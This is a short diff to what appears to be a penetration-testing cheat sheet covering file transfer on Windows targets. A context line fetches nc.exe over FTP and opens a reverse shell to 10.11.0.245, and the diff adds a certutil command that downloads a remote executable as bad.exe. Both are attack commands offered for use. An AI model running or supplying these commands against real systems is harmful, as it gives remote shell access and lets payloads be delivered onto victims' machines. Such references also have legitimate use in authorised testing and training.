@@ -479,6 +479,12 @@ ftp -s:ftp-commands.txt
 (echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
 ```
 
+#### CertUtil
+
+```text
+certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
+```
+
 #### PHP
 
 ```php
